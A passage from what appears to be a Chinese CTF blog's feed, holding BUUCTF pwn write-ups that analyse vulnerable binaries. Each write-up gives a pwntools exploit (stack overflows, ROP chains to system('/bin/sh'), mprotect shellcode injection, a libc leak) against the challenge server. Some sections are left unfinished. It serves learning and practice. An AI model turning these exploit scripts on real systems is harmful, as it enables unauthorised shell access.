= <span class="hljs-string">b&#x27;a&#x27;</span>*padding+p32(system_addr)+p32(<span class="hljs-number">0</span>)+p32(str_bin_sh)<br><br>io.recvuntil(<span class="hljs-string">&#x27;Input:\n&#x27;</span>)<br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="30-ciscn-2019-s-3"><a href="#30-ciscn-2019-s-3" class="headerlink" title="30.ciscn_2019_s_3"></a>30.ciscn_2019_s_3</h1><p>ret2csu&#x2F;SROP</p><h2 id="1-分析-9"><a href="#1-分析-9" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230921221842411.png" alt="image-20230921221842411"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230922121125568.png" alt="image-20230922121125568"></p><p>vuln</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230922121405115.png" alt="image-20230922121405115"></p><p>gadgets</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230922130435860.png" alt="image-20230922130435860"></p><p>发现了将rax赋值为59的操作</p><p>传参方式：首先将系统调用号 传入 rax，然后将参数 从左到右 依次存入 rdi，rsi，rdx寄存器中，返回值存在rax寄存器</p><p>调用号：sys_read 的调用号 为 0 ；sys_write 的调用号 为 1；stub_execve 的调用号 为 59； stub_rt_sigreturn 的调用号 为 15</p><p>调用方式: 使用 syscall 进行系统调用</p><p>loc_4011FE 段全是 pop，所以这段代码可以将我们构造的栈中的值全部存入 rbx, rbp, r12, r13, r14, r15寄存器中<br>loc_4011E8 段会比较复杂一点：</p><p>首先三段 mov 指令将存储在 r15的值赋给 rdx，存储在 r14的值赋给 rsi，存储在 r13的值赋给 edi，此时 rdi 的高32位寄存器中值为0，所以我们也可以控制 rdi 的值。<br>然后 call 指令跳转到 r12寄存器存储的位置处（在 gadgets1中置 rbx&#x3D;0）<br>rbx+1，判断是否与 rbp 相等，否则重新执行 gadgets2，这里我们为了不重新执行，将 rbp 置为1</p><h2 id="2-payload-9"><a href="#2-payload-9" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><h1 id="30题-ret2csu-sigret-SROP-总结"><a href="#30题-ret2csu-sigret-SROP-总结" class="headerlink" title="30题(ret2csu+sigret&#x2F;SROP)总结"></a>30题(ret2csu+sigret&#x2F;SROP)总结</h1><h2 id="ret2csu原理"><a href="#ret2csu原理" class="headerlink" title="ret2csu原理"></a>ret2csu原理</h2><p>_libc_csu_init 函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数大部分程序里都有。</p><p>简单来说此攻击方式就是利用 _libc_csu_init 函数中多个对寄存器的弹栈指令来修改我们攻击中所需的寄存器值完成exp的编写。</p><p>该函数中被利用的汇编指令如下：</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20231121194310456.png" alt="image-20231121194310456"></p><p>那么我们找到程序溢出点后需要</p><h2 id="SROP原理"><a href="#SROP原理" class="headerlink" title="SROP原理"></a>SROP原理</h2><h3 id="linux系统调用及signal机制"><a href="#linux系统调用及signal机制" class="headerlink" title="linux系统调用及signal机制"></a>linux系统调用及signal机制</h3><h3 id="SROP攻击过程分析"><a href="#SROP攻击过程分析" class="headerlink" title="SROP攻击过程分析"></a>SROP攻击过程分析</h3>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
      <category>pwn练习记录</category>
      
      <category>BUUCTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11~20</title>
    <link href="/2023/09/04/WP/BUUCTF/11-20/"/>
    <url>/2023/09/04/WP/BUUCTF/11-20/</url>
    
    <content type="html"><![CDATA[<h1 id="11-bjdctf-2020-babystack"><a href="#11-bjdctf-2020-babystack" class="headerlink" title="11.bjdctf_2020_babystack"></a>11.bjdctf_2020_babystack</h1><p>很简单的ret2text</p><h2 id="1-分析"><a href="#1-分析" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905175019807.png"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905175116080.png"></p><p>buf前的nbytes可以控制read函数的读入字节数，造成溢出点</p><p>backdoor</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905175245867.png"></p><p>则<br>binsh_addr&#x3D;0x4006e6</p><p>溢出长度在IDA中看一下就好</p><h2 id="2-payload"><a href="#2-payload" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25702</span>)<br><br>binsh_addr=<span class="hljs-number">0x4006e6</span><br><br>io.sendline(<span class="hljs-string">&#x27;100&#x27;</span>)<span class="hljs-comment">#造成溢出</span><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>+<span class="hljs-number">0x08</span>)+p64(binsh_addr)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="12-get-started-3dsctf-2016"><a href="#12-get-started-3dsctf-2016" class="headerlink" title="12.get_started_3dsctf_2016"></a>12.get_started_3dsctf_2016</h1><h2 id="1-分析-1"><a href="#1-分析-1" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905195200839.png"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905195304244.png"></p><p>有gets溢出漏洞</p><p>看到提示函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905195051226.png"></p><p>进入内存看a1和a2在栈上的参数位置，它们的位置在返回地址之后，没法利用溢出覆盖来控制程序</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905221041393.png"></p><p>查看打开flag的地方</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905222758963.png"></p><p>可以看到在此位置程序打开flag文件，我们控制程序跳转到此处执行理论上就可以拿到flag，但是发现只能在本地打通。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>查看网上师傅的wp发现无法拿到的原因是因为我们没有维持栈的平衡，导致程序异常退出，但为啥本地异常退出可以回显文本中的字符串而远程不可以，这就不太清楚，有可能远端做了限制。</p><p><strong>通过后门函数进行回显flag</strong></p><p>针对上面远端无法拿到结果的问题，这里给出新的解法，也就是维护好栈，使得执行完get_flag()后门函数让程序正常退出。打远程时，如果程序是异常退出了，最后是不给你回显的。所以我们得想办法让程序正常退出。C语言有个函数是exit，只要执行这个只要我们把get_flag的返回地址写成exit的地址，程序就可以正常结束并且有回显了。（&#x3D;&#x3D;静态编译文件&#x3D;&#x3D;）</p><p>通过GDB或IDA，我们可以拿到exit函数的地址</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905223515055.png"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230905223612259.png"></p><p>那么思路就有了</p><p>我们先利用gets溢出控制程序打开flag文件，再用exit函数让程序可以正常退出，最后将返回地址溢出成&#x3D;&#x3D;带参数的&#x3D;&#x3D;，就能拿到flag</p><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>这题比较巧妙的做法</p><p>程序里有一个mprotect函数（&#x3D;&#x3D;以后静态编译文件可以试着找找此类库函数&#x3D;&#x3D;），它的作用是能够修改内存的权限为可读可写可执行，然后我们就可以往栈上写入shellcode，执行即可获取shell</p><p>首先学习一下这个函数</p><blockquote><p>int mprotect(const void *start, size_t len, int prot);</p><p>　　第一个参数填的是一个地址，是指需要进行操作的地址。</p><p>　　第二个参数是地址往后多大的长度。</p><p>　　第三个参数的是要赋予的权限。</p><p>　　mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p><p>　　prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p><p>　　1）PROT_READ：表示内存段内的内容可写；</p><p>　　2）PROT_WRITE：表示内存段内的内容可读；</p><p>　　3）PROT_EXEC：表示内存段中的内容可执行；</p><p>　　4）PROT_NONE：表示内存段中的内容根本没法访问。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230906222921832.png"></p><p>　<strong>prot&#x3D;7 是可读可写可执行</strong></p><p>　　需要指出的是，指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。<br>(通过看源码，可以发现几个参数都是整型数据，就不奇怪了)</p></blockquote><p>就这样，我们就可以将一段地址弄成可以执行的了。因为程序本身也是&#x3D;&#x3D;静态编译&#x3D;&#x3D;，所以地址是不会变的。</p><p>首先利用了mprotect函数修改内存权限，然后利用read读取shellcode到该内存区域。由于开启了NX保护，所以不断利用retn返回地址来达到调用函数，注入shellcode的目的。</p><p>那么我们需要做的是</p><ul><li>第一个参数为需要修改的内存起始地址，这个地址也就是我们接下来shellcode将要写入的地方；</li><li>&#x3D;&#x3D;第二个参数为修改的内存大小，一般取内存的整数页&#x3D;&#x3D;；</li><li>第三个参数为0x7，表示该内存拥有可读可写可执行权限。</li></ul><p>read函数第一个参数是打开的文件描述符，0表示输入；第二参数指明读取的数据存放的内存起始位置；第三个参数指明最大读取的字节数。而每次调用函数后都是返回到pop_3_ret中执行，是用该段汇编代码弹出压入栈中的三个参数来达到栈平衡。该代码的地址不唯一，在程序中找到相应弹出三个栈的操作再加retn的汇编代码就行。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230906223642674.png"></p><p>&#x3D;&#x3D;随便找就行&#x3D;&#x3D;</p><p>具体方法见exp2</p><h2 id="2-payload-1"><a href="#2-payload-1" class="headerlink" title="(2)payload"></a>(2)payload</h2><p>exp1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">25018</span>)<br><span class="hljs-comment">#io=process(&#x27;./get_started_3dsctf_2016&#x27;)</span><br><br>exit_addr=<span class="hljs-number">0x804E6A0</span><br>get_flag_addr=<span class="hljs-number">0x80489A0</span><br>a1=<span class="hljs-number">814536271</span><br>a2=<span class="hljs-number">425138641</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span>+p32(get_flag_addr)+p32(exit_addr)+p32(a1)+p32(a2)<br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><p>exp2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>elf = ELF(<span class="hljs-string">&#x27;./get_started_3dsctf_2016&#x27;</span>)<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="hljs-number">25689</span>)<br><br>pop3_ret = <span class="hljs-number">0x804951D</span> <span class="hljs-comment">#不唯一</span><br><br>mem_addr = <span class="hljs-number">0x80EB000</span><br>mem_size = <span class="hljs-number">0x1000</span>    <br>mem_proc = <span class="hljs-number">0x7</span>       <span class="hljs-comment">#设置mprotect函数的三个参数</span><br><br>mprotect_addr = elf.symbols[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br>read_addr = elf.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>payload1  = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0x38</span><br>payload1 += p32(mprotect_addr)<br>payload1 += p32(pop3_ret) <br><br>payload1 += p32(mem_addr)  <br>payload1 += p32(mem_size)  <br>payload1 += p32(mem_proc)   <br><br>payload1 += p32(read_addr)<br>payload1 += p32(pop3_ret)  <br><br>payload1 += p32(<span class="hljs-number">0</span>)     <br>payload1 += p32(mem_addr)   <br>payload1 += p32(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#设置read函数的三个参数</span><br><br>payload1 += p32(mem_addr)<span class="hljs-comment">#将read函数的返回地址设置到我们修改的内存的地址，去执行shellcode</span><br><br>io.sendline(payload1)<br><br>shellcode = asm(shellcraft.sh())<span class="hljs-comment">#利用pwntools直接生成shellcode </span><br>io.sendline(shellcode)<span class="hljs-comment">#执行shellcode</span><br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="(3)总结"></a>(3)总结</h2><h1 id="13-jarvisoj-level2-x64"><a href="#13-jarvisoj-level2-x64" class="headerlink" title="13.jarvisoj_level2_x64"></a>13.jarvisoj_level2_x64</h1><h2 id="1-分析-2"><a href="#1-分析-2" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230907213504196.png"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230907213545179.png"></p><p>vulnerable_function</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230907213639359.png"></p><p>read函数漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230907213751673.png"></p><p>system和&#x2F;bin&#x2F;sh字符串都有</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230907214134058.png"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230907214200463.png"></p><p>没啥好说的，ret2text，注意一下64位ROP链构造</p><blockquote><p>payload&#x3D;B’a’*offset+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)</p></blockquote><h2 id="2-payload-2"><a href="#2-payload-2" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io=remote(<span class="hljs-string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="hljs-number">29274</span>)<br><span class="hljs-comment">#io = process(&#x27;./13&#x27;)</span><br><br>binsh_addr = <span class="hljs-number">0x600A90</span><br>system_addr = <span class="hljs-number">0x40063E</span><br>pop_rdi_ret = <span class="hljs-number">0x4006b3</span> <br><br>payload=<span class="hljs-string">B&#x27;a&#x27;</span>*<span class="hljs-number">0x88</span>+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)<span class="hljs-comment">#64位的ROP链</span><br><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h1 id="14-OGeek2019-babyrop"><a href="#14-OGeek2019-babyrop" class="headerlink" title="14.[OGeek2019]babyrop"></a>14.[OGeek2019]babyrop</h1><h2 id="1-分析-3"><a href="#1-分析-3" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230909174533331.png" alt="image-20230909174533331"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230909184712006.png" alt="image-20230909184712006"></p><p>&#x2F;dev&#x2F;urandom是Linux的一个生成随机数文件，0代表只读，但是open函数还是返回一个大于0的数，read函数将fd赋给buf，因此buf处的数是随机的。<br>将buf作为参数传给sub_804871F，返回值赋值给v2，将v2作为参数传给 sub_80487D0。</p><p>进入sub_804871F函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230909184840533.png" alt="image-20230909184840533"></p><p>memset函数：将某一块区域内容设置为指定内容（0），多用于数组的初始化。<br>memset函数会将s和buf中元素都初始化为0.<br>sprintf函数，将a1打印在s上。<br>read函数从键盘读取0x20字节内容写入buf，并将返回值赋值给v5，read函数返回值为读取的字节数。<br>接下来判断buf和s大小，相等返回0，不相等返回非0的数程序就会终止。因此第一个任务就是使比较结果为0，不让程序退出，我们可以采用’\0’截断绕过，让v1为0，这样strncmp函数会立即返回0。</p><p>sub_80487D0函数</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910124242455.png" alt="image-20230910124242455"></p><p>把v5的值作为参数传入，进行条件判断运算。在第2个read中，只要a1足够大，就能发生栈溢出，并且能够溢出到ret位置。</p><p>根据ASCLL码最大值为255，用‘\xff’表示，我们将buf[7]改为‘\xff’即可造成溢出</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910185130316.png" alt="image-20230910185130316"></p><p>在sub_804871F函数中，为防止程序退出，就要使strncmp(buf, s, v1)结果为0<br>可以看到v1 &#x3D; strlen(buf);用\0截断，在输入时设置第一个元素为\x00<br>最后返回的时buf[7]，看sub_80487D0函数，我们需要将传入的参数尽可能大了写，这样才能栈溢出并进行想要的操作<br>所以在输入时就要将buf[7]也一起修改了。<br>另外，sendline函数的结束符也是算一个字节的，所以输入的时候只要*7就可以了（当然保险起见， *8也是可以的）</p><h2 id="2-payload-3"><a href="#2-payload-3" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><span class="hljs-comment">#from LibcSearcher import*</span><br><span class="hljs-comment">#io=process(&quot;./pwn&quot;)</span><br>io=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29655</span>)<br>elf=ELF(<span class="hljs-string">&quot;./14&quot;</span>)<br><br>main_addr=<span class="hljs-number">0x8048825</span><br><br>payload = <span class="hljs-string">b&#x27;\x00&#x27;</span><span class="hljs-comment">#利用strlen函数’\0’截断绕过</span><br>payload += <span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">8</span><span class="hljs-comment">#将buf[7]改为255</span><br><br>io.sendline(payload)<span class="hljs-comment">#sendline函数会自动在末尾加上换行符</span><br>io.recvuntil(<span class="hljs-string">&#x27;Correct\n&#x27;</span>)<br><br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xe7</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(write_plt)+p32(main_addr)<span class="hljs-comment">#main函数为前一个的函数返回地址</span><br>payload1 += p32(<span class="hljs-number">1</span>)+p32(write_got)+p32(<span class="hljs-number">4</span>)<span class="hljs-comment">#p32(1)和p32(4)为write(1, &quot;Correct\n&quot;, 8u);的两个参数</span><br><br>io.sendline(payload1)<br><br>write_addr=u32(io.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(write_addr))<span class="hljs-comment">#定位write函数地址</span><br><br>libc=ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>sys_addr=libcbase+libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>bin_sh=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<span class="hljs-comment">#利用题目的libc版本找system和/bin/sh字符串</span><br><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xe7</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">4</span>+p32(sys_addr)+p32(<span class="hljs-number">0</span>)+p32(bin_sh)<span class="hljs-comment">#32位的ROP链</span><br><br>io.sendline(payload)<br>io.recvuntil(<span class="hljs-string">&#x27;Correct\n&#x27;</span>)<br>io.sendline(payload2)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="3-总结-1"><a href="#3-总结-1" class="headerlink" title="(3)总结"></a>(3)总结</h2><ul><li>strlen的特性是遇到’\0’就停止记录字符串长度，这里可以考虑\0截断绕过strncmp函数判定。</li><li>在LibcSearcher找不到匹配的libc库的时候，要会使用题目中给的libc版本</li><li>32位程序函数参数直接压入栈中，即函数地址-&gt;函数的返回地址-&gt;参数n-&gt;参数n-1&gt;···&gt;参数1</li><li>python3取消了binsh_libc&#x3D;libc.search(‘&#x2F;bin&#x2F;sh’).next()的用法。</li></ul><h1 id="15-HarekazeCTF2019-baby-rop"><a href="#15-HarekazeCTF2019-baby-rop" class="headerlink" title="15.[HarekazeCTF2019]baby_rop"></a>15.[HarekazeCTF2019]baby_rop</h1><h2 id="1-分析-4"><a href="#1-分析-4" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910164146081.png" alt="image-20230910164146081"></p><p>main</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910164213785.png" alt="image-20230910164213785"></p><p>看字符串</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910164251162.png" alt="image-20230910164251162"></p><p>system和&#x2F;bin&#x2F;sh字符串都有</p><p>binsh_addr&#x3D;0x601048<br>system_addr&#x3D;0x400490（找_system函数地址）</p><p>接下来就是ROPgadget找gadgets</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910164946229.png" alt="image-20230910164946229"></p><p>这时发现ROP链打不通</p><p>排查原因也不是payload的问题，考虑栈对齐问题</p><h3 id="关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题"><a href="#关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题" class="headerlink" title="关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题"></a>关于ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</h3><p><strong>64位ubuntu18以上系统调用system函数时是需要栈对齐的</strong>。再<strong>具体一点就是64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐</strong>，如果你到system函数执行的时候，si单步进去就会发现，如果没对齐的话，最后就会卡在这里（如下图）。</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910181524930.png" alt="image-20230910181524930"></p><p>程序会卡在这里不动了，无法继续执行</p><p>我们可以看一下栈内的状态</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910181919480.png" alt="image-20230910181919480"></p><p>因为64位程序的地址是8字节的，而十六进制又是满16就会进位，因此我们看到的栈地址末尾要么是0要么是8。</p><p>只有当地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。而我们想要在ubuntu18以上的64位程序中执行system函数，必须要在执行system地址末尾是0。</p><p>所以上图是没对齐的情况，所以我们需要加一个凑数用的gadget<br>于是找到上面的ret地址（对ROP链无影响）</p><p>下面是打通的栈内状态</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910183603522.png" alt="image-20230910183603522"></p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910183531239.png" alt="image-20230910183531239"></p><p>可以看到首地址末尾是0了</p><p>然后我们又发现打通后flag不在当前目录<br>使用这条指令就能找到flag所在文件目录</p><blockquote><p>find &#x2F; -name flag<br>cat .&#x2F;xxx&#x2F;xxx&#x2F;flag</p></blockquote><p>那么本题完结</p><h2 id="2-payload-4"><a href="#2-payload-4" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>io=process(<span class="hljs-string">&#x27;./15&#x27;</span>)<br><span class="hljs-comment">#io=remote(&#x27;node4.buuoj.cn&#x27;,25669)</span><br><br>pop_rdi_ret=<span class="hljs-number">0x400683</span><br>binsh_addr=<span class="hljs-number">0x601048</span><br>system_addr=<span class="hljs-number">0x400490</span><br>pop_ret=<span class="hljs-number">0x0400479</span><br><br>payload=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+p64(pop_ret)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)<br><span class="hljs-comment">#gdb.attach(io)</span><br>io.sendline(payload)<br>io.interactive()<br></code></pre></td></tr></table></figure><h2 id="3-总结-2"><a href="#3-总结-2" class="headerlink" title="(3)总结"></a>(3)总结</h2><ul><li>Ubuntu18以上版本注意栈对齐问题</li><li>flag不在当前目录要会找</li></ul><h1 id="16-ciscn-2019-n-5"><a href="#16-ciscn-2019-n-5" class="headerlink" title="16.ciscn_2019_n_5"></a>16.ciscn_2019_n_5</h1><h2 id="1-分析-5"><a href="#1-分析-5" class="headerlink" title="(1)分析"></a>(1)分析</h2><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910192917771.png" alt="image-20230910192917771"></p><p>基本没有保护，程序也没有system和&#x2F;bin&#x2F;sh字符串，可以试试ret2shellcode</p><p><img src="https://cdn.jsdelivr.net/gh/jwjlearning/Blog-Pic@main/img/image-20230910194239722.png" alt="image-20230910194239722"></p><p>name是bss段的，在name上写shellcode，然后gets溢出到name的地址执行shellcode</p><h2 id="2-payload-5"><a href="#2-payload-5" class="headerlink" title="(2)payload"></a>(2)payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br><br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#io=process(&#x27;./16&#x27;)</span><br>io=remote(<span 